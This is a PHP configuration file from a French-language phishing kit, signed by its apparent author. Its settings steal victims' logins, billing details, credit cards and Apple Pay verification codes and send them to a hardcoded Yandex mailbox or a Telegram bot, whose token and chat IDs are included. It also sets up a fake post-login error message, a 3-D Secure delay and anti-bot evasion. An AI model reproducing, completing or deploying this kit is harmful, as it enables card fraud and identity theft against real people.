<?php

/*

▄▄▄▄ ▓██   ██▓    ▄████▄   █    ██  ██▀███    ██████ ▓█████ ▓█████▄ 
▓█████▄▒██  ██▒   ▒██▀ ▀█   ██  ▓██▒▓██ ▒ ██▒▒██    ▒ ▓█   ▀ ▒██▀ ██▌
▒██▒ ▄██▒██ ██░   ▒▓█    ▄ ▓██  ▒██░▓██ ░▄█ ▒░ ▓██▄   ▒███   ░██   █▌
▒██░█▀  ░ ▐██▓░   ▒▓▓▄ ▄██▒▓▓█  ░██░▒██▀▀█▄    ▒   ██▒▒▓█  ▄ ░▓█▄   ▌
░▓█  ▀█▓░ ██▒▓░   ▒ ▓███▀ ░▒▒█████▓ ░██▓ ▒██▒▒██████▒▒░▒████▒░▒████▓ 
░▒▓███▀▒ ██▒▒▒    ░ ░▒ ▒  ░░▒▓▒ ▒ ▒ ░ ▒▓ ░▒▓░▒ ▒▓▒ ▒ ░░░ ▒░ ░ ▒▒▓  ▒ 
▒░▒   ░▓██ ░▒░      ░  ▒   ░░▒░ ░ ░   ░▒ ░ ▒░░ ░▒  ░ ░ ░ ░  ░ ░ ▒  ▒ 
 ░    ░▒ ▒ ░░     ░         ░░░ ░ ░   ░░   ░ ░  ░  ░     ░    ░ ░  ░ 
 ░     ░ ░        ░ ░         ░        ░           ░     ░  ░   ░    
      ░░ ░        ░                                           ░      
By Cursed
Telegram : @Cursedinho

*/

// REZ CONFIG \\

// CHAQUE OPTION ACTIVEE PAR true SE DESCATIVE PAR false

$message_erreur = true; // MESSAGE D'ERREUR APRES LA CONNEXION DE LA VICTIME

$rez_emojis = true; // REZ AVEC DES EMOJIS

$rez_billing = false; // REZ LE BILLING SEPAREMENT (VOUS RECEVEREZ QUAND MEME LA CC AVEC LE FULL INFO)

// MAIL CONFIG
$rez_mail = true; // REZ PAR MAIL 
$rezmail = 'chouchouchoubinks@yandex.com'; // LE MAIL QUI VA RECPETIONNER LES REZ
$sender_from = '👑💎 CHOUBINKS 💎👑'; // LE PSEUDO QUI VA ENVOYER LES REZ
$sender_mail = 'choubinks'; // LE MAIL QUI VA ENVOYER LES REZ (MET JUSTE TON NOM SANS MAJUSCULES/EMOJIS/CARACTHERES SPECIAUX)

// TELEGRAM CONFIG
$rez_tlg = false; // REZ PAR TELEGRAM
$token = "5526149465:AAEkpwgHtq2z5zhEEkGpKl3nYcu6ABlVtYM"; // LE TOKEN DE VOTRE BOT
$log_chatid = '5375267857'; // LE CHAT ID QUI VA RECEPTIONNER LES LOG's
$billing_chatid = '5375267857'; // LE CHAT ID QUI VA RECEPTIONNER LES FULLZ
$card_chatid = '5375267857'; // LE CHAT ID QUI VA RECEPTIONNER LES CC's
$ap_chatid = '5375267857'; // LE CHAT ID QUI VA RECEPTIONNER LES CODE APPLE PAY

// VBV OPTIONS
$vbv = false; // VBV APPLE PAY
$countdown = 15; // CHARGEMENT DE LA VICTIME AVANT LE VBV APRES AVOIR MIS SA CC

// ANTIBOTS OPTIONS
$test_mode = false; // true POUR DESACTIVER LES AB

?> 